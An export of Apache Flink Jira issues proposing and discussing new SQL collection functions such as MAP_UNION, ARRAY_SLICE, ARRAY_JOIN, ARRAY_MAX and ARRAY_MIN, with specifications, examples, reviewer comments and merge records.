 map_entries[input_map] 
 Output: [{'key': 1, 'value': 'apple'}, {'key': 2, 'value': 'banana'}, {'key': 3, 'value': 'cherry'}]{code}
 # Handling an empty map:

{code:java}
empty_map = {} 
map_entries[empty_map]
Output: []{code}
See also:

spark:[https://spark.apache.org/docs/latest/api/sql/index.html#map_entries]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Feb 20 17:44:53 UTC 2024,,,,,,,,,,"0|z1ic7c:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"05/Jun/23 18:35;bvarghese;[~martijnvisser] can you please assign this ticket to [~hanyuzheng] ?;;;","05/Jun/23 19:24;Sergey Nuyanzin;[~bvarghese]
Can you please provide more info: about expected behavior and support by other engines with corresponding links?;;;","04/Sep/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issue is assigned but has not received an update in 30 days, so it has been labeled ""stale-assigned"".
If you are still working on the issue, please remove the label and add a comment updating the community on your progress.  If this issue is waiting on feedback, please consider this a reminder to the committer/reviewer. Flink is a very active project, and so we appreciate your patience.
If you are no longer working on the issue, please unassign yourself so someone else may work on it.
;;;","20/Feb/24 17:44;hanyuzheng;has been implemented [https://github.com/apache/flink/pull/22312|http://example.com];;;",,,,,,,,,,,,,,,,,,,
Add MAP_UNION support in SQL & Table API,FLINK-32261,13538809,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,hanyuzheng,bvarghese,bvarghese,05/Jun/23 18:24,11/Mar/24 21:13,04/Jun/24 20:41,11/Mar/24 21:13,1.18.0,,,,,,,,,,,,,,1.20.0,,,,,,Table SQL / Planner,,,,0,pull-request-available,stale-assigned,,"Description:

This is an implementation of MAP_UNION 

Returns a map created by merging two maps, 'map1' and 'map2'. This two maps should have same data structure. If there are overlapping keys, the value from 'map2' will overwrite the value from 'map1'. If any of maps are null, return null.

Syntax:
{code:java}
MAP_UNION(map1, map2){code}
Arguments:
 * map1:The first map to be merged.
 * map2:The second map to be merged.

Returns: A new map that contains the combined key-value pairs from {{map1}} and map{{{}2{}}}. If there are any overlapping keys, the value from {{map2}} will overwrite the value from {{{}map1{}}}.

Examples:

 Merging maps with unique keys:

 
{code:java}
map1 = ['a': 1, 'b': 2] map2 = ['c': 3, 'd': 4] 
map_union[map1, map2]  
Output: ['a': 1, 'b': 2, 'c': 3, 'd': 4]{code}
 Merging maps with overlapping keys:

 
 
{code:java}
map1 = ['a': 1, 'b': 2] map2 = ['b': 3, 'c': 4] 
map_union[map1, map2] 
Output: ['a': 1, 'b': 3, 'c': 4]{code}
See also:

prestodb: [https://prestodb.io/docs/current/functions/aggregate.html]

 

 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Mar 11 21:13:32 UTC 2024,,,,,,,,,,"0|z1ic74:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"05/Jun/23 18:35;bvarghese;[~martijnvisser] can you please assign this ticket to [~hanyuzheng] ?;;;","05/Jun/23 19:25;Sergey Nuyanzin;[~bvarghese]
Can you please provide more info: about expected behavior and support by other engines with corresponding links?;;;","06/Jun/23 02:07;luoyuxia;[~bvarghese] Thanks for creating these issue. Notice you have created many simiar issues, is it similar to FLINK-6810? Would it make sense to put them into FLINK-6810  or create a unbrella issue to include the issuse you created make it  easier to manage?;;;","28/Jun/23 20:42;hanyuzheng;[~Sergey Nuyanzin] I have already updated the map_union function, can you help me review it again?;;;","05/Jul/23 06:29;jackylau;hi [~hanyuzheng] [~Sergey Nuyanzin]  i have a question, spark supports map_concat [https://spark.apache.org/docs/latest/api/sql/index.html#map_concat|https://spark.apache.org/docs/latest/api/sql/index.html#map_concat,]

which supports serveral map. and it is common use, why not supports this?;;;","07/Jul/23 21:29;Sergey Nuyanzin;Thanks for the question.

Let's not look at spark only

Based on some research and besides Spark
there is {{map_union}} supporting arbitrary number of args for MaxCompute[1]

{{map_concat}} supporting arbitrary number of args for  Trino [2], Presto[3]
{{map_union}} only for 2 args is supported by ksqlDB[4]

Based on this yep, probably it would make sense to support varargs since there are several vendors already supporting it.

WDYT [~hanyuzheng]?

[1] https://www.alibabacloud.com/help/en/maxcompute/user-guide/map-union
[2] https://trino.io/docs/current/functions/map.html 
[3] https://prestodb.io/docs/current/functions/aggregate.html
[4] https://docs.ksqldb.io/en/latest/developer-guide/ksqldb-reference/scalar-functions/#map_union
;;;","07/Jul/23 22:11;hanyuzheng;[~Sergey Nuyanzin] I think it's a good suggestion. It's good idea to support varargs. By the way, can you help me to polish new description of this function?

 
{code:java}
Returns a map created by merging at least one map. These maps should have a common map type. If there are overlapping keys, the value from 'map2' will overwrite the value from 'map1', the value from 'map3' will overwrite the value from 'map2', the value from 'mapn' will overwrite the value from 'map(n-1)'. If any of maps is null, return null.{code}
 ;;;","26/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issue is assigned but has not received an update in 30 days, so it has been labeled ""stale-assigned"".
If you are still working on the issue, please remove the label and add a comment updating the community on your progress.  If this issue is waiting on feedback, please consider this a reminder to the committer/reviewer. Flink is a very active project, and so we appreciate your patience.
If you are no longer working on the issue, please unassign yourself so someone else may work on it.
;;;","11/Mar/24 21:13;Sergey Nuyanzin;Merged as [c2a6feee16c5a547ccfd30f00b0a31c57fb790ec|https://github.com/apache/flink/commit/c2a6feee16c5a547ccfd30f00b0a31c57fb790ec];;;",,,,,,,,,,,,,,
Add ARRAY_SLICE support in SQL & Table API,FLINK-32260,13538808,,Improvement,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,hanyuzheng,bvarghese,bvarghese,05/Jun/23 18:22,08/Jul/23 17:00,04/Jun/24 20:41,08/Jul/23 10:17,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / Planner,,,,0,pull-request-available,,,"Implement the array_slice function to extract a subset of elements from an array.
This function returns a subset of the input array, starting from 'start_offset' and ending at 'end_offset'. These offsets are 1-based and can be positive (counted from the start of the array) or negative (counted from the end of the array).

Initially, the function checks if 'start_offset' or 'end_offset' are 0. If so, they are treated as starting from the beginning of the input array.

Next, the function checks if 'start_offset' is after 'end_offset' or if the input array is empty. In such cases, it will return an empty array.

For the remaining cases, the function proceeds as follows: if either 'start_offset' or 'end_offset' exceed the array bounds, they are adjusted to the size of the array. Conversely, if the absolute value of a negative 'start_offset' or 'end_offset' is greater than the size of the array, the corresponding offset is reset to the beginning of the array, which is 1.

The function will return null if any input is null.
Syntax:

 
code
{code:java}
ARRAY_SLICE(array, start_offset, end_offset){code}
{{ }}
Arguments:

array: The array that contains the elements you want to slice.
start_offset: The inclusive starting offset.
end_offset: The inclusive ending offset.

An offset can be positive or negative. A positive offset starts from the beginning of the input array and is 1-based. A negative offset starts from the end of the input array. Out-of-bounds offsets are supported. if start_offset == 0 or end_offset == 0, we treat them start from the beginning of the input array.

Returns:
The input array can contain NULL elements. NULL elements are included in the resulting array.
Returns NULL if array, start_offset, or end_offset is NULL.
Returns an empty array if array is empty.
Returns an empty array if the position of the start_offset in the array is after the position of the end_offset.

Examples:

 
{code:java}
SELECT ARRAY_SLICE(['a', 'b', 'c', 'd', 'e'], 1, 3)
Output: [a, b, c]

SELECT ARRAY_SLICE(['a', 'b', 'c', 'd', 'e'], -1, -3)
Output: []

SELECT ARRAY_SLICE(['a', 'b', 'c', 'd', 'e'], -3, -1)
Output[c, d, e]

SELECT ARRAY_SLICE(['a', 'b', 'c', 'd', 'e'], 3, 3)
Output[c]

SELECT ARRAY_SLICE(['a', 'b', 'c', 'd', 'e'], 1, 30)
Output[a, b,c,d,e]
SELECT ARRAY_SLICE(['a', 'b', 'c', 'd', 'e'], 1, -30)
Output[]

SELECT ARRAY_SLICE(['a', 'b', 'c', 'd', 'e'], -30, 30)
Output[a, b, c, d, e]

SELECT ARRAY_SLICE(['a', 'b', 'c', 'd', 'e'], -30, -5)
Output[a]

SELECT ARRAY_SLICE(['a', 'b', 'c', 'd', 'e'], 5, 30)
Output[e]
 
SELECT ARRAY_SLICE(['a', 'b', NULL, 'd', 'e'], 1, 3) 
Output[a, b, null]

SELECT ARRAY_SLICE(['a', 'b', NULL, 'd', 'e'], 0, 0) 
Output[a]
{code}
 

see also:
spark: [https://spark.apache.org/docs/latest/api/sql/index.html#slice]
google cloud: [https://cloud.google.com/spanner/docs/reference/standard-sql/array_functions#array_slice]
ClickHouse: [https://clickhouse.com/docs/en/sql-reference/functions/array-functions#arrayslice]
DockDb: [https://duckdb.org/docs/sql/functions/nested#list-functions]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sat Jul 08 10:17:11 UTC 2023,,,,,,,,,,"0|z1ic6w:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"05/Jun/23 18:35;bvarghese;[~martijnvisser] can you please assign this ticket to [~hanyuzheng] ?;;;","26/Jun/23 20:01;Sergey Nuyanzin;I would suggest to change behavior of the function a bit to be consistent with lots of other vendors.

1. Rename args. IMHO Google Spanner[1] has the best naming {{ARRAY_SLICE(array_to_slice, start_offset, end_offset)}}, other also have ok naming. The main issue is that the vendors I mentioned here support zero and negative third arg and in this case it is not clear what is negative length for instance.
2. Return {{NULL}} *+only+* if one of the input args is {{NULL}}. Otherwise return sliced array or empty array. This is the behavior of Google Spanner[1], Cosmos DB[2], ClickHouse[3], DuckDB[4], Snowflake[5].
3. It is ok to have the third arg 0 or negative, non-{{NULL}} value should be returned
4. Clickhouse[3] and Cosmos DB[2] have the third arg as optional meaning that if it is not specified the array will be sliced till the end (similar to {{substring}}). Itwould make sense to have this as well


[1] https://cloud.google.com/spanner/docs/reference/standard-sql/array_functions#array_slice
[2] https://learn.microsoft.com/en-us/azure/cosmos-db/nosql/query/array-slice
[3] https://clickhouse.com/docs/en/sql-reference/functions/array-functions#arrayslice
[4] https://duckdb.org/docs/sql/functions/nested#list-functions
[5] https://docs.snowflake.com/en/sql-reference/functions/array_slice

P.S. for some of vendors this behavior is not specified explicitly in doc however it could be double checked against latest versions (I did it myself);;;","27/Jun/23 05:09;hanyuzheng;[~Sergey Nuyanzin] thank you for your suggestions.

Let us talk about this with [~bvarghese] and [~twalthr] ;;;","27/Jun/23 14:56;twalthr;Btw how will the index work? Will it be 0-based or 1-based for the offsets. This is a really annoying topic in SQL. Indices in SQL usually start with 1.

Update: It seems all vendors use 0-based. That's good. Not sure whether we still have functions in Flink that are 1-based (SUBSTRING?).;;;","27/Jun/23 15:43;Sergey Nuyanzin;About indexing: it seems vendors are not in sync...
Google Spanner, Cosmos DB, Snowflake are 0-based

Clickhouse, DuckDB are 1-based

yes, in Flink {{SUBSTRING}} is 1-based
also in Flink {{OVERLAY}}, {{INSTR}} are 1-based (seems all string related functions)
Also array indexing in Flink is happening with 1-based approach;;;","27/Jun/23 16:31;hanyuzheng;Thank you [~Sergey Nuyanzin]  and [~twalthr]  I will change the description and rewrite this function.;;;","27/Jun/23 16:33;hanyuzheng;So we should base on 1-based in this function? [~twalthr] [~Sergey Nuyanzin];;;","28/Jun/23 14:15;hanyuzheng;I am currently attempting to adjust an array slice function to switch from a 0-based index to a 1-based index . However, I have encountered some issues related to this change, specifically with regards to handling the start_offset and end_offset:

In the context of a 1-based index, if we have a query like array_slice[0, 2], what would be the expected output? Since 0 is not a valid index in a 1-based system, how should we handle this start_offset or end_offset when it is set to 0?

If we have a query like array_slice[1, 0], how should this be interpreted? According to the Google Cloud array_slice definition, the function should return an empty array if the position of the start_offset in the array is after the position of the end_offset. But in this case, since we are using a 1-based index, should we consider these positions to be the same and return [1], or should we consider end_offset of 0 to be invalid and return an empty array?

 

[~Sergey Nuyanzin] [~twalthr] ;;;","28/Jun/23 14:39;Sergey Nuyanzin;There is also no consensus between vendors
DuckDB treats 0 and 1 as same so (could be checked online via https://shell.duckdb.org/)
{noformat}

duckdb> select  array_slice(array[1, 2, 3], 0, 2); 
┌─────────────────────────────────────┐
│ array_slice((ARRAY[1, 2, 3]), 0, 2) │
╞═════════════════════════════════════╡
│ [1, 2]                              │
└─────────────────────────────────────┘
Elapsed: 5 ms

duckdb> select  array_slice(array[1, 2, 3], 1, 2); 
┌─────────────────────────────────────┐
│ array_slice((ARRAY[1, 2, 3]), 1, 2) │
╞═════════════════════════════════════╡
│ [1, 2]                              │
└─────────────────────────────────────┘
Elapsed: 4 ms

duckdb> select  array_slice(array[1, 2, 3], 0, 2); 
┌─────────────────────────────────────┐
│ array_slice((ARRAY[1, 2, 3]), 0, 2) │
╞═════════════════════════════════════╡
│ [1, 2]                              │
└─────────────────────────────────────┘
Elapsed: 10 ms

duckdb> select  array_slice(array[1, 2, 3], 0, -2); 
┌──────────────────────────────────────┐
│ array_slice((ARRAY[1, 2, 3]), 0, -2) │
╞══════════════════════════════════════╡
│ [1]                                  │
└──────────────────────────────────────┘
Elapsed: 3 ms

duckdb> select  array_slice(array[1, 2, 3], 1, -2); 
┌──────────────────────────────────────┐
│ array_slice((ARRAY[1, 2, 3]), 1, -2) │
╞══════════════════════════════════════╡
│ [1]                                  │
└──────────────────────────────────────┘
Elapsed: 3 ms
{noformat}

for ClickHouse it's different: for any query with {{start_offset==0}} it returns empty array;;;","28/Jun/23 14:49;hanyuzheng;[~Sergey Nuyanzin] I think we can treat 0 as 1 to achieve our array_slice function, do you think this is ok?

 

I think we cannot follow Clickhouse one because it's third argument cannot be negative. But our function behavior follow google cloud one. it's third argument is end_offset and it can be negative.;;;","28/Jun/23 15:11;Sergey Nuyanzin;if it's clearly mentioned in doc i'm ok with that;;;","28/Jun/23 16:24;hanyuzheng;Google cloud's array_slice is 0-base, so our start_offset and end_offset refer from google.

And 0 problem solution refer from DuckDB;;;","08/Jul/23 10:17;Sergey Nuyanzin;Merged to master as [e6e0f47bf3e7f7541da9e7be009cc6dcf4d86129|https://github.com/apache/flink/commit/e6e0f47bf3e7f7541da9e7be009cc6dcf4d86129];;;",,,,,,,,,,
Add ARRAY_JOIN support in SQL & Table API,FLINK-32259,13538807,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,hanyuzheng,bvarghese,bvarghese,05/Jun/23 18:21,03/Jul/23 18:13,04/Jun/24 20:41,03/Jul/23 15:20,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / Planner,,,,0,pull-request-available,,,"Concatenates the elements of the array with a delimiter and optional string to replace nulls.



Syntax:

array_join(array, delimiter, null_replacement)

 

Arguments:

array: An ARRAY to be handled.

delimiter: A STRING used to separate the concatenated array elements.

null_replacement: A STRING used to express a NULL value in the result.



Returns:

A STRING where the elements of array are separated by delimiter and null elements are substituted for null_replacement. If null_replacement parameter is not provided, null elements are filtered out. If any argument is NULL, the result is NULL.

Examples:
{code:java}
> SELECT array_join(array('hello', 'world'), ' ');
hello world

> SELECT array_join(array('hello', NULL ,'world'), ' ');
hello world

> SELECT array_join(array('hello', NULL ,'world'), ' ', ',');
hello , world{code}
 

See also:
spark - [https://spark.apache.org/docs/latest/api/sql/index.html#array_join]
presto - [https://prestodb.io/docs/current/functions/array.html]

 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jul 03 15:20:04 UTC 2023,,,,,,,,,,"0|z1ic6o:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"05/Jun/23 18:35;bvarghese;[~martijnvisser] can you please assign this ticket to [~hanyuzheng] ?;;;","03/Jul/23 15:20;dwysakowicz;Implemented in 962e51f771882ecc4664b8e406e733764ea8cd9f;;;",,,,,,,,,,,,,,,,,,,,,
Add ARRAY_SORT support in SQL & Table API,FLINK-32258,13538806,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Duplicate,hanyuzheng,bvarghese,bvarghese,05/Jun/23 18:19,05/Jun/23 19:32,04/Jun/24 20:41,05/Jun/23 19:27,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / Planner,,,,0,,,,,,,,,,,,,,,,,,,,,,,,FLINK-26948,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jun 05 19:27:42 UTC 2023,,,,,,,,,,"0|z1ic6g:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"05/Jun/23 18:35;bvarghese;[~martijnvisser] can you please assign this ticket to [~hanyuzheng] ?;;;","05/Jun/23 19:27;Sergey Nuyanzin;This is a duplicate of FLINK-26948
based on name
sorry if not then please provide more description;;;",,,,,,,,,,,,,,,,,,,,,
Add ARRAY_MAX support in SQL & Table API,FLINK-32257,13538805,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,hanyuzheng,bvarghese,bvarghese,05/Jun/23 18:16,05/Jul/23 08:37,04/Jun/24 20:41,30/Jun/23 09:12,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / Planner,,,,0,pull-request-available,,,"This is an implementation of ARRAY_MAX

The array_max() function concatenates get the maximum element from input array.

The result matches the type of the elements. NULL elements are skipped. If array is empty, or contains only NULL elements, NULL is returned.

 

Syntax

array_max(array)

Arguments

array: Any ARRAY with elements for which order is supported.

 

Returns

The result matches the type of the elements. NULL elements are skipped. If array is empty, or contains only NULL elements, NULL is returned.

 

Examples

SQL

 

> SELECT array_max(array(1, 20, NULL, 3)); 20

 
{code:java}
// Fink SQL-> select array_max(array[1, 20, null, 3])
20{code}
 

See also
spark [https://spark.apache.org/docs/latest/api/sql/index.html#array_max|https://spark.apache.org/docs/latest/api/sql/index.html#array_min]

presto [https://prestodb.io/docs/current/functions/array.html]
",,,,,,,,,,,,,,FLINK-32498,,,,,,,,,FLINK-32490,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jul 05 08:37:44 UTC 2023,,,,,,,,,,"0|z1ic68:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"05/Jun/23 18:34;bvarghese;[~martijnvisser] can you please assign this ticket to [~hanyuzheng] ?;;;","05/Jun/23 19:28;Sergey Nuyanzin;[~bvarghese]
Can you please provide more info: about expected behavior and support by other engines with corresponding links?;;;","29/Jun/23 14:44;dwysakowicz;Implemented in 318d7e4daa8c791521ed2c256285c42a35b4eba6;;;","29/Jun/23 16:13;Sergey Nuyanzin;[~hanyuzheng], [~dwysakowicz]
I'm really sorry however we had to revert this change since it brings a blocker issue with {{ArrayElementOutputTypeStrategyTest}}
which is constantly failing even locally like
{noformat}
[ERROR] Failures: 
[ERROR]   ArrayElementOutputTypeStrategyTest>TypeStrategiesTestBase.testTypeStrategy:58 
expected: ""INT NOT NULL (AtomicDataType@26e4eacd)""
 but was: ""INT NOT NULL (AtomicDataType@1716b369)""
[ERROR]   ArrayElementOutputTypeStrategyTest>TypeStrategiesTestBase.testTypeStrategy:58 
expected: ""INT (AtomicDataType@18ab74e7)""
 but was: ""INT (AtomicDataType@f0704a2)""
{noformat}
and ci mirror
https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50669&view=logs&j=0c940707-2659-5648-cbe6-a1ad63045f0a&t=075c2716-8010-5565-fe08-3c4bb45824a4&l=8884;;;","29/Jun/23 16:14;mapohl;Just for the sake of documentation:
revert on master: 5ad86c2f01bea141ca76250ae4035d4e6403c8ea (FLINK-32490);;;","30/Jun/23 08:37;jackylau;hi guys [~hanyuzheng] [~dwysakowicz] [~Sergey Nuyanzin] [~mapohl] 

sorry for late review, the pr looks good. but it also exists bug.
 i supports these spark collection function recently. i am familiar with it.
because do not have people help review , i supports these in calcite [https://github.com/apache/calcite/commits?author=liuyongvs]

the return type is not right. it should always return nullable.

because we don't know the value whether is null in compile procedure, only can know in the runtime.
for example:
{code:java}
-- ddl : 
CREATE TABLE data_source (
  a array<int not null> not null
) WITH (
  'connector'='xxx',
); 

// the element is array(), that is to say, empty array. the result is null.
// if the return type is int not null, how to save null value.
select array_max(a) from data_source;{code}
 
{code:java}
-- spark 
case class ArrayMax(child: Expression)
  extends UnaryExpression with ImplicitCastInputTypes with NullIntolerant {
  
  override def nullable: Boolean = true    @transient override lazy val 

  dataType: DataType = child.dataType match {
    case ArrayType(dt, _) => dt
    case _ => throw new IllegalStateException(s""$prettyName accepts only arrays."")
}{code};;;","30/Jun/23 08:45;dwysakowicz;You're right [~jackylau]

Do you mind creating a bug ticket?;;;","30/Jun/23 09:00;mapohl;Just for me to understand: We reverted the change yesterday because we hoped to stabilize {{master}}. Considering that the changes of this Jira issue are not present in {{master}} anymore, wouldn't it be enough to create another PR as part of this Jira issue?;;;","30/Jun/23 09:11;dwysakowicz;[~mapohl] The thing is I merged it again with a fix for tests like 40 minutes ago.

Now [~jackylau] pointed an issue in the logic.;;;","30/Jun/23 09:12;dwysakowicz;Merged again with fixed tests in: 82776bffe7d93b5eb26c82dcce00b60155a82450;;;","30/Jun/23 09:14;mapohl;Got it - thanks for clarification :);;;","30/Jun/23 09:16;jackylau;hi [~dwysakowicz] [~mapohl]  i create a issue to fix this https://issues.apache.org/jira/browse/FLINK-32498

and if you can help review, i would love to supports all these collection functions to flink. will you have time to help review ?;;;","30/Jun/23 09:19;dwysakowicz;[~jackylau]I'd love to spend more time reviewing tickets, but my time unfortunately is very limited nowadays. I cannot make any promises, but I'll try to review at least one of your PRs.;;;","30/Jun/23 09:19;dwysakowicz;Thank you for checking this PR by the way!;;;","30/Jun/23 09:20;jackylau;[~dwysakowicz] thanks very much.;;;","30/Jun/23 09:27;jackylau;hi [~dwysakowicz] if you have time , could you help review this ?

 

[https://github.com/apache/flink/pull/22745]

https://github.com/apache/flink/pull/22143

[https://github.com/apache/flink/pull/22250]

https://github.com/apache/flink/pull/22629;;;","30/Jun/23 20:34;hanyuzheng;Hi [~jackylau], I am also working on collection functions.

I am also working on MAP_ENTRIES https://issues.apache.org/jira/browse/FLINK-32262

 ;;;","05/Jul/23 02:40;jackylau;hi [~hanyuzheng] MAP_ENTRIES i have already supported and merged in the master;;;","05/Jul/23 02:45;jackylau;hi [~dwysakowicz]  [~hanyuzheng] [~Sergey Nuyanzin] , the array_max return type i submitted has fixed and merged.

and i found another problem. why array_max don't support array/row type. spark supports it
{code:java}
// code placeholder
def isOrderable(dataType: DataType): Boolean = dataType match {
  case NullType => true
  case dt: AtomicType => true
  case struct: StructType => struct.fields.forall(f => isOrderable(f.dataType))
  case array: ArrayType => isOrderable(array.elementType)
  case udt: UserDefinedType[_] => isOrderable(udt.sqlType)
  case _ => false
} {code}
and our flink has also supported in code gen for example in the 
ComparableTypeStrategy, the ArrayComparableElementTypeStrategy refers to ComparableTypeStrategy, but don't put areTypesOfSameRootComparable
what do you think?
{code:java}
public static final BuiltInFunctionDefinition GREATEST =
        BuiltInFunctionDefinition.newBuilder()
                .name(""GREATEST"")
                .kind(SCALAR)
                .inputTypeStrategy(
                        comparable(ConstantArgumentCount.from(1), StructuredComparison.FULL))
                .outputTypeStrategy(nullableIfArgs(TypeStrategies.COMMON))
                .runtimeProvided()
                .build(); {code};;;","05/Jul/23 08:03;dwysakowicz;[~jackylau] Please read through: https://github.com/apache/flink/pull/22730#discussion_r1242187327

To be honest it's rather an issue in `ComparableTypeStrategy`.;;;","05/Jul/23 08:25;jackylau;[~dwysakowicz] after read the [https://github.com/apache/flink/pull/22730#discussion_r1242187327] 

and test in sql client. it throw exception.

 
{code:java}
Flink SQL> select greatest(array[1, 2],array[2, 3]);
[ERROR] Could not execute SQL statement. Reason:
org.apache.flink.table.planner.codegen.CodeGenException: Comparable type expected, but was 'ARRAY<INT NOT NULL> NOT NULL'.


Flink SQL> select greatest(row(1, 2),row(2, 3));
[ERROR] Could not execute SQL statement. Reason:
org.apache.flink.table.planner.codegen.CodeGenException: Comparable type expected, but was 'ROW<`EXPR$0` INT NOT NULL, `EXPR$1` INT NOT NULL> NOT NULL'. {code}
 

and after dig the code, flink doesn't support  complex type compare.

and we can supports like spark latter.

and both the ArrayComparableElementTypeStrategy and ComparableTypeStrategy may need have a abstract. or ArrayComparableElementTypeStrategy should have a comments about the remove \{{areTypesOfSameRootComparable(firstType, secondType). }}

{{it will cause lost easily when flink }}{{supports complex type compare because others don't know it.}}

{{what do you think?}}

{{and if you have time i can support the complex  type }}{{compare }} if you have time to help review?

 
{code:java}
case class PhysicalArrayType(
    elementType: DataType, containsNull: Boolean) extends PhysicalDataType {
  override private[sql] type InternalType = ArrayData
  override private[sql] def ordering = interpretedOrdering
  @transient private[sql] lazy val tag = typeTag[InternalType]

  @transient
  private[sql] lazy val interpretedOrdering: Ordering[ArrayData] = new Ordering[ArrayData] {
    private[this] val elementOrdering: Ordering[Any] =
      PhysicalDataType(elementType).ordering.asInstanceOf[Ordering[Any]]

    def compare(x: ArrayData, y: ArrayData): Int = {
      val leftArray = x
      val rightArray = y
      val minLength = scala.math.min(leftArray.numElements(), rightArray.numElements())
      var i = 0
      while (i < minLength) {
        val isNullLeft = leftArray.isNullAt(i)
        val isNullRight = rightArray.isNullAt(i)
        if (isNullLeft && isNullRight) {
          // Do nothing.
        } else if (isNullLeft) {
          return -1
        } else if (isNullRight) {
          return 1
        } else {
          val comp =
            elementOrdering.compare(
              leftArray.get(i, elementType),
              rightArray.get(i, elementType))
          if (comp != 0) {
            return comp
          }
        }
        i += 1
      }
      if (leftArray.numElements() < rightArray.numElements()) {
        -1
      } else if (leftArray.numElements() > rightArray.numElements()) {
        1
      } else {
        0
      }
    }
  }
}

case class PhysicalStructType(fields: Array[StructField]) extends PhysicalDataType {
  override private[sql] type InternalType = Any
  override private[sql] def ordering =
    forSchema(this.fields.map(_.dataType)).asInstanceOf[Ordering[InternalType]]
  @transient private[sql] lazy val tag = typeTag[InternalType]

  private[sql] def forSchema(dataTypes: Seq[DataType]): InterpretedOrdering = {
    new InterpretedOrdering(dataTypes.zipWithIndex.map {
      case (dt, index) => SortOrder(BoundReference(index, dt, nullable = true), Ascending)
    })
  }
} {code}
 ;;;","05/Jul/23 08:27;dwysakowicz;I'd rather stick to what is supported today. I am not confident we ever support comparing complex types.;;;","05/Jul/23 08:37;jackylau;[~dwysakowicz] i can support the complex type compare like spark, do you have time to help review it?;;;"
Add ARRAY_MIN support in SQL & Table API,FLINK-32256,13538801,,New Feature,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Implemented,hanyuzheng,bvarghese,bvarghese,05/Jun/23 17:55,12/Jan/24 09:10,04/Jun/24 20:41,12/Jan/24 09:10,1.18.0,,,,,,,,,,,,,,1.19.0,,,,,,Table SQL / Planner,,,,0,pull-request-available,stale-assigned,,"Find the minimum among all elements in the array for which ordering is supported.

Syntax:

array_min(array)

Arguments:
array: An ARRAY to be handled.

Returns:

The result matches the type of the elements. NULL elements are skipped. If array is empty, or contains only NULL elements, NULL is returned.

Examples:
{code:sql}
SELECT array_min(array(1, 20, NULL, 3));
-- 1
{code}
See also
spark [https://spark.apache.org/docs/latest/api/sql/index.html#array_min]

presto [https://prestodb.io/docs/current/functions/array.html]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jan 12 09:10:06 UTC 2024,,,,,,,,,,"0|z1ic5c:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"05/Jun/23 17:57;bvarghese;[~martijnvisser] can you please assign this ticket to [~hanyuzheng] ;;;","05/Jun/23 18:04;martijnvisser;Sure thing! ;;;","05/Jun/23 19:28;Sergey Nuyanzin;[~bvarghese]
Can you please provide more info: about expected behavior and support by other engines with corresponding links?;;;","10/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issue is assigned but has not received an update in 30 days, so it has been labeled ""stale-assigned"".
If you are still working on the issue, please remove the label and add a comment updating the community on your progress.  If this issue is waiting on feedback, please consider this a reminder to the committer/reviewer. Flink is a very active project, and so we appreciate your patience.
If you are no longer working on the issue, please unassign yourself so someone else may work on it.
;;;","12/Jan/24 09:10;dwysakowicz;Implemented in 2c70bd346d37f96f01007c89e3eb66e919c0c0a8;;;",,,,,,,,,,,,,,,,,,
